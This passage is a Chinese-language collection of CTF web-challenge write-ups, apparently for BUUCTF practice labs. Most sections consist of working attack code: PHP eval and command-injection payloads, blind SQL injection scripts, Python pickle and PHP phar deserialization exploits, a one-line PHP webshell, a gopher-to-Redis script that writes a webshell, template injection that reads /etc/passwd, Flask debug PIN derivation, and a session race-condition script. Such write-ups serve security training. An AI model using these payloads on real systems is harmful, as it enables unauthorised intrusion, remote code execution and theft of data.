这里思路窄了，以为只要一个位置就可以，怎么也弄不出来单引号。但实际上在path后面有一个单引号，只要有一个反斜杠来转义id后面的引号就可以了。可以使用\\\\0，addslashes变成\\\\\\\\0，strreplace变成\\。由于没有显示位，使用布尔盲注。当id=1时有图片，id=0时显示有错误。 [CISCN 2019 初赛]Love Math函数： 123456scandir() # 返回指定目录中的文件和目录的数组base_convert() # 转换禁止dechex() # 十进制转为十六进制hex2bin() # 十六进制转为ASCII字符var_dump() # 输出变量信息readfile() # 输出文件 特性： 动态函数：可以把函数名用字符串传递给变量，通过此变量动态调用函数。$func='die';$func(); 函数名默认为字符串 12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval('echo '.$content.';');} 不能出现blacklist中的内容，preg_match_all得到的内容必须在whitelist里，同时payload有长度限制。 方法一：构造$_GET $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=ls / 12345base_convert(37907361743,10,36) ==&gt; &quot;hex2bin&quot;dechex(1598506324) ==&gt; &quot;5f474554&quot;base_convert(37907361743,10,36)(dechex(1598506324))==&gt; hex2bin(&quot;5f474554&quot;) ==&gt; &quot;_GET&quot;$_GET{pi}{$_GET{abs}} ==&gt; system('ls /'') 方法二：构造getallheaders $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) 123base_convert(696468,10,36) =&gt; &quot;exec&quot;$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;exec(getallheaders(){1}) 发包时用burp抓包，在headers添加1: cat /flag 方法三：异或 fuzz： 1234567891011&lt;?php$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];for($k=1;$k&lt;=sizeof($payload);$k++){ for($i = 0;$i &lt; 9; $i++){ for($j = 0;$j &lt;=9;$j++){ $exp = $payload[$k] ^ $i.$j; echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; } }} $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag [CISCN2019 华北赛区 Day1 Web2]ikun先注册个账号，找到lv6的号， 123456789import requestsurl = &quot;http://26f12b49-df5d-419d-9c3a-50988d616703.node1.buuoj.cn/shop?page=&quot;for i in range(1000): r = requests.get(url + str(i)) if &quot;lv6.png&quot; in r.text: print i break 然后购买，抓包，把discount改成0.000000000001，就可以买下来。 发现只有admin可以访问，查看cookie，有一个jwt，到 jwt.io ，解码，把 username 改为admin ，用 https://github.com/brendan-rius/c-jwt-cracker，跑出签名为 1Kun，再到 jwt.io得到 jwt，eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo，用edit this cookie改成新的jwt，刷新可以看到 “一键成为大会员”，也可以看到源码，打开源码里面admin.py，看到pickle.loads(urllib.qoute(become))，（反序列化文章，http://www.sohu.com/a/274879579_729271），一键成为大会员按钮会post一个 become 参数，利用反序列化漏洞读取flag 123456789&gt;&gt;&gt; import urllib&gt;&gt;&gt; import pickle&gt;&gt;&gt; class a(object):... def __reduce__(self):... return (eval,(&quot;open('/flag.txt','r').read()&quot;,))...&gt;&gt;&gt; a = pickle.dumps(a())&gt;&gt;&gt; a = urllib.quote(a)&gt;&gt;&gt; print a 得到c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.，抓包，把become=admin改成上面的字符串，得到flag [CISCN2019 华北赛区 Day2 Web1]Hack World一共就两条数据，过滤了空格，and，or，布尔盲注。 可以使用id=0^[payload]或者id=if([payload],1,2)。后者只能用于数字型。 12345678910111213141516171819import requestsurl = &quot;http://c30faac4-d474-4905-a58f-c43c968a74ac.node3.buuoj.cn:80/index.php&quot;i = 1while True: left = 32 right = 127 while True: if right - left == 1: print(chr(right), end='') break mid = int((right+left)/2) data = {&quot;id&quot;: &quot;if(ascii(mid((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i, mid)} r = requests.post(url, data=data, proxies={'http':'127.0.0.1:9999'}) if 'Hello' in r.text: left = mid else: right = mid i += 1 可能是在print()函数中用end关键字参数的话不会刷新缓冲区，大概觉着跑完了就Ctrl+C，就能看到结果了 = =。 [CISCN2019 总决赛 Day2 Web1]Easywebrobots.txt，有 image.php.bak 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 不应该过\\\\0,传入\\0,加反斜线变成\\\\\\0，过之后变成\\，可以逃逸。 12image.php?id=\\0&amp;path=+or+id=3+order+by+2%23 # 成功image.php?id=\\0&amp;path=+or+id=3+order+by+3%23 # 失败 盲注 123456789101112131415161718192021222324252627import requestsurl = &quot;http://b74c9739-071c-4a0f-9c97-f7eff3e4438e.node3.buuoj.cn/image.php&quot;result = ''for i in range(0, 30): right = 127 left = 32 mid = int((right + left) &gt;&gt; 1) while right &gt; left: payload = &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid) # select group_concat(column_name) from information_schema.columns where table_schema=database() # params = { 'id': '\\\\0', 'path': payload } response = requests.get(url, params=params) if &quot;JFIF&quot; in response.text: left = mid + 1 else: right = mid mid = int((right + left) &gt;&gt; 1) result += chr(mid) print(result) 回显位置，发现是 php，有上传的文件名。再次上传文件名为 php 木马的文件，连接日志文件获得 shell 1logs/upload.1de80834766269f33c963dd093dee010.log.php 文件名 1&lt;?=@eval($_POST['c']);?&gt; [CISCN2019 华东南赛区]Web11Smarty 模板注入，可以使用一些 php 语句 12{if show_source('/flag')}{/if}{readfile('/flag')} [CISCN2019 华北赛区 Day1 Web1]Dropbox走一遍正常流程，注册登录，上传只能传图，下载的地方抓一下包，filename这里有路径穿越，读了index, upload, download, class, delete, login，开始审计。 upload里面会检查文件类型，然后把后缀名改成图片的类型，默认是gif。 download限制了文件名长度，其中不能含有flag。 重点是class.php，其中有3个类，FIle, Filelist, User 123456class File { public $filename; public function close() { return file_get_contents($this-&gt;filename); }} FIle类中的close()有file_get_contents()可以用来获取flag，但是没有输出 123456class User { public $db; public function __destruct() { $this-&gt;db-&gt;close(); }} User类中有__destruct()，在User类销毁的时候可以调用db的close方法，如果db是一个File类的实例，就能调用FIle的close读取flag，但还是不能输出。 123456789101112131415161718192021222324252627class FileList { private $files; private $results; private $funcs; public function __call($func, $args) { array_push($this-&gt;func, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = 'html...'; $table .= 'html...'; foreach ($this-&gt;funcs as $func) { $table .= 'html...'; } $table .= 'html...' foreach ($this-&gt;results as $filename =&gt; $result) { $table .='html..'; foreach ($result as $func =&gt; $value) { $table .= '..'.htmlentities($value).'..'; } $table .= '...'.htmlentities($filename).'..'; } echo $table; }} FileList 类中有__call()，可以调用File的close()，还能存储结果输出出来。 思路：创建一个User类的对象，它的db变量是一个FileList对象，FileList的files变量是包含一个File对象的数组，这个File对象的filename变量是flag的位置。User对象销毁时会调用db的close()，db是一个FIleLIst对象，没有close()的情况下会调用__call()，再调用File（$filename=’/flag.txt’）的close()，返回值存到FileList的$result里，再打印出来。 可以利用phar创建符合以上要求的对象，可以参考博客里的 phar扩展php反序列化攻击面。生成phar： 1234567891011121314151617181920212223242526272829&lt;?phpclass User { public $db;}class File { public $filename;}class FileList { private $files; private $results; private $funcs; public function __construct() { $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); }}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;jwt.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; 很多文件系统函数可以触发phar的反序列化，这个网站有上传、下载和删除操作，都看一遍，上传和下载都没什么，删除的地方有个unlink，正好可以利用，把生成的phar后缀名改成jpg，上传，在删除的地方抓包，可以得到flag。 [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 分为3个路由，geneSgn生成'scan' + param的md5。index给你看一下源代码。challenge接受action，param，sign三个参数，param过一下waf（不能以gopher或者file开头），进入Exec，首先检查secret_key + param + action的md5与 sing 是否一致，然后判断 scan 和 read 是否在action中。如果含有scan则把param文件写入tmpfile，含有read返回tmpfile的内容。 解法一：哈希长度扩展攻击 secret_key长度16，geneSign?param=flag.txt 可以得到 md5(secret_key + 'flag.txt' + 'scan')，目的是获取md5(secret_key + 'flag.txt' + action)其中action含有read。可以使用哈希长度扩展攻击。 得到action 为 scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%0 0%00%00%00%00%00read时的md59b02232286ed9dd4f7e52eba63094180，发包即可。 12345678910import requestsurl = 'http://63904195-027d-4866-a049-78fd37f2a920.node3.buuoj.cn/De1ta?param=flag.txt'cookies = { 'sign': '9b02232286ed9dd4f7e52eba63094180', 'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read', }r = requests.get(url, cookies=cookies)print(r.text) 解法二：字符串拼接 问题在于geneSign处，返回的md5是scret_key + flag.txt + scan，即&lt;secret_key&gt;flag.txtscan，所以直接访问/geneSign?param=flag.txtread得到的md5就是&lt;secret_key&gt;flag.txtreadscan的MD5，用这个MD5作为sign访问/De1ta?param=flag.txt，action为readscan，直接可以得到flag。 urllib.urlopen()可以用file://包含文件，这里过滤了，可以使用local_file:代替。 easy tornadohint.txt里面告诉了filehash的生成方式，需要我们找到cookie_secret。 welcome.txt 写了render，flag.txt里给了flag的路径。 http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag，提示Error，同时url变成http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=Error，结合上面的render可以想到模板注入获得cookie_secret。 http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg={{handler.application.settings}}，得到cookiesecet，e85fca1a-db5a-4d80-82aa-53d3a3d1637a ，MD5一下 12345678import hashlibcs = 'e85fca1a-db5a-4d80-82aa-53d3a3d1637a'fn = /fllllllllllllagdef md5(s): md5 = hashlib.md5 md5.update(s.encode()) return md5.hexdigest()print(md5(cs+md5(fn))) http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag &amp;filehash=a7982b91f8645e9107b05b0721a6fceb [GKCTF2020]cve版签到含有提示 cve-2020-7066，查一下，getheaders函数存在00截断，tips 要求结尾是123 1?url=http:%2f%2f127.0.0.123%00www.ctfhub.com [GKCTF2020]老八小超市儿shopxo后台全版本获取shell复现 访问后台/admin.php?s=/admin/logininfo.html，使用admin:shopxo登录 找到 应用中心 应用商店 主题，下载粉红主题，在主题的 default/_static_/目录下添加木马，重新压缩 到 网站管理 主题管理 主题安装，上传压缩后的主题，l连接木马路径/public/static/index/lengyu/shell.php 根目录下的 flag 文件提示 flag 在 root 下，但无权限。根目录有 auto.sh，定时运行 makeflag，找到该文件，改为 12import osos.system(&quot;cat /root/flag&gt;/1.txt&quot;) 等待一分钟，得到 flag [GKCTF2020]EZ三剑客-EzWeb访问 secret ，除了 127.0.0.1 以外还有两个 IP 地址，173.183.118.10/24 和 172.18.0.13/12，应该是一个 SSRF，扫描一下 173.183.118.10/24 子网里的其他主机， 过滤了 file://和dict://协议，使用 HTTP 探测 使用 intruder 爆破，在 173.183.118.12 的响应中看到 1被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1 爆破这台机器的端口，在 6379 端口看到 1-ERR wrong number of arguments for 'get' command 存在 redis 服务 使用 gopher 协议利用未授权访问写入 shell 12345678910111213141516171819202122232425262728293031323334353637import urllibprotocol = r&quot;gopher://&quot;ip = &quot;173.183.118.12&quot;port = &quot;6379&quot;shell = &quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename = &quot;shell.php&quot;path = &quot;/var/www/html&quot;passwd = &quot;&quot;cmd = [&quot;flushall&quot;, &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;, &quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0, &quot;AUTH {}&quot;.format(passwd))payload = protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF = &quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd = &quot;&quot; cmd += &quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd += CRLF+&quot;$&quot; + \\ str(len((x.replace(&quot;${IFS}&quot;, &quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;, &quot; &quot;) cmd += CRLF return cmdif __name__ == &quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 生成 payload 1gopher://173.183.118.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 在 url 中访问 http://173.183.118.12/shell.php [GKCTF2020]CheckIN把 base64 编码后的命令传入Ginkgo后就可以执行 1?Ginkgo=cGhwaW5mbygpOw== #phpinfo(); 存在 disable_functions，禁用了一些执行系统命令的函数。本质上是一个黑名单。 1?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=phpinfo(); # @eval($_GET['c']); 测试成功，使用蚁剑连接，发现根目录下的 flag，不可读。存在 readflag 二进制文件。 使用 Github 上的 PHP 7.0-7.3 disable_functions bypass，项目地址，使用 gc-bypass，修改其中的命令为 /readflag，上传至 /tmp，include 上传的文件 1?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=include('/tmp/exploit.php'); 得到 flag [GXYCTF2019]BabyUpload上传 .htaccess 修改类型，上传图片马，蚁剑连接。有个坑，蚁剑不能连 GET 的马。 [GXYCTF2019]禁止套娃12345678localeconv() 函数返回一包含本地数字及货币格式信息的数组。scandir() 列出 images 目录中的文件和目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。 存在.git泄露，得到源码。同时存在白名单和黑名单 1exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); [GXYCTF2019]Ping Ping Ping命令执行，过滤了空格和很多特殊字符。 12345678?ip=1.1.1.1|ls //发现index.php和flag.php?ip=1.1.1.1|cat flag.php //发现过滤了空格?ip=1.1.1.1|cat&lt;flag.php //过滤了特殊字符?ip=1.1.1.1|cat$IFS$1flag.php //用$IFS$1代替空格,发现过滤了flag?ip=1.1.1.1|cat$IFS$1index.php //查看源码，发现过滤了特殊字符、bash、空格、flag?ip=1.1.1.1;a=g;cat$IFS$1fla$a.php //利用shell变量绕过flag的过滤?ip=1.1.1.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //用sh执行?ip=1.1.1.1;cat$IFS`ls` //内联执行，反引号内的命令输出作为输入 [GXYCTF2019]BabySQli试了一下，用户名的位置会报错，只过滤了括号，=和小写的or，页面里有注释，先 base32 再 base64，select * from user where username = '$name'。 有3列，试一下admin' union select 1,2,3%23，提示wrong pass。是对输入的 pw 进行了 md5，然后查表中的数据，最后 1name=rrrrrrrrrr' union select 1,'admin','202cb962ac59075b964b07152d234b70'%23&amp;pw=123 其中202cb962ac59075b964b07152d234b70'%23是 123 的MD5。 [GWCTF 2019]我有一个数据库phpMyadmin 任意文件包含 payload:http://92909cd3-f955-4efa-99af-dc3d378a1ec6.node3.buuoj.cn/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag [GWCTF 2019]枯燥的抽奖check.php 12345678910111213141516171819202122232425262728&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST['num'])){ if($_POST['num']===$str){x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;) mt_rand()漏洞，伪随机，可以爆破 seed 123456789101112str1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2 = 'LTa1ZXoMsb'str3 = str1[::-1]length = len(str2)res = ''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' ' breakprint(res) 生成 php_mt_seed 所需的参数后 12maketime ./php_mt_seed 47 47 0 61 55 55 0 61 0 0 0 61 27 27 0 61 61 61 0 61 59 59 0 61 14 14 0 61 48 48 0 61 18 18 0 61 1 1 0 61 爆破出 seed 之后重新生成 str，至少需要 PHP 7.2 123456789101112&lt;?phpmt_srand(945888871);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; [GYCTF2020]FlaskApp模板注入，加密页面输入 1{{1+1}} 把结果放到解密页面解密，得到 2，存在模板注入。payload 1{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}} 可以读取到文件，但是不知道 flag 位置，需要打开 debug 模式中的 python shell，需要获取 PIN 码 PIN 码由以下几个值计算得到： 服务器运行 flask 的用户名，通过读取 /etc/passwd 得到，此题目为 flaskweb modname，一般为 flask.app getattr(app, &quot;\\_\\_name__&quot;, app.\\_\\_class__.\\_\\_name__)，一般为 Flask flask 库下 app.py 的绝对路径，通过报错信息可以得到，本题目为/usr/local/lib/python3.7/site-packages/flask/app.py 当前网络 MAC 地址的十进制数，通过文件/sys/class/net/eth0/address得到 机器ID，一般在/etc/machine-id或者/proc/sys/kerne/random/boot-i，docker 容器在/proc/sef/cgroup，name=systemd:/docker/后面的一串就是ID 计算 PIN 码，在Lib\\site-packages\\werkzeug\\debug\\\\_\\_init__.py 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # 用户名 'flask.app', # modname 'Flask', # Flask '/usr/local/lib/python3.7/site-packages/flask/app.py', # app.py 路径]private_bits = [ '2485410412221', # MAC 地址 '6743637069af7e10cfc09a74d23b62c700765cc89e2ae6d0f43150e839dde80e' # 机器ID]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 得到 PIN 码进入 python shell，使用 os 模块执行系统命令 123import osos.popen('ls /').read()os.popen('cat /this_is_flag.txt').read() [GYCTF2020]Blacklist黑名单preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠注入 + handler 代替 select 1231'; show tables;# 查表1'; show columns from FlagHere;# 查列名1'; handler FlagHere open as aaaa; handler aaaa read first; handler aaaa close;# 利用 handler 代替 select 查询数据 [HCTF] 2018 warmup代码审计，定义了白名单，判断file参数问号之前的内容是不是在白名单里。利用文件包含漏洞（CVE-2018-2613），?file=hint.php?.././../../../../ffffllllaaaagggg，其中问号可以url编码，效果一样。 [HCTF] admin随便注册个账号，登录，在修改密码的地方发现一行注释，给了源码 方法1： session伪造 flask将session存储在客户端（浏览器），并且不对session进行加密，只进行签名，不能防止session被读取，但可以防止被篡改，得到签名后可以伪造session 登录后看下自己的session，读取一下 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 拿到内容，在config.py发现密钥 ckj123，把得到的内容中的user改为admin，user_id改为1，伪造session（https://github.com/noraj/flask-session-cookie-manager），替换掉原来的session就可以得到flag 方法2：unicode欺骗 route.py的login函数和change函数里都有strlower这个操作，而不是正常的lower。 跟进一下，看到nodeprep.prepare，对应的库是twisted。 在requirements.txt中，twisted的版本是10.2.0，最新的是18，差距很大。查一下，这个函数会自动进行如下转换 ᴀ -&gt; A -&gt; a 于是我们注册ᴀ dmin，登录后变成Admin，改密码的时候就会改掉admin的密码，成功登录。 方法3：条件竞争 在login和change函数中都没有进行检查，而是先赋值到name和session.name，在已有登录的session情况下，登录admin，修改密码，就可以修改掉admin的密码，但是login函数进行了判断，可以开双线程绕过。 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport threadingdef login(s, username, password): data = { 'username': username, 'password': password, 'submit': '' } return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/login&quot;, data=data)def logout(s): return s.get(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/logout&quot;)def change(s, newpassword): data = { 'newpassword':newpassword } return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/change&quot;, data=data)def func1(s): login(s, 'skysec', 'skysec') change(s, 'skysec')def func2(s): logout(s) res = login(s, 'admin', 'skysec') if '&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;' in res.text: print('finish')def main(): for i in range(1000): print(i) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() ps：复现失败，预想的结果是会把admin的密码改为skysec，就可以登录。但实际上我可能是被buuctf给ban了 [HFCTF2020]EasyLoginNode.js 代码审计、弱类型、依赖库缺陷 static/js/app.js: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */function login() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); const token = sessionStorage.getItem(&quot;token&quot;); $.post(&quot;/api/login&quot;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = &quot;/home&quot;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function register() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); $.post(&quot;/api/register&quot;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem('token', token); document.location = 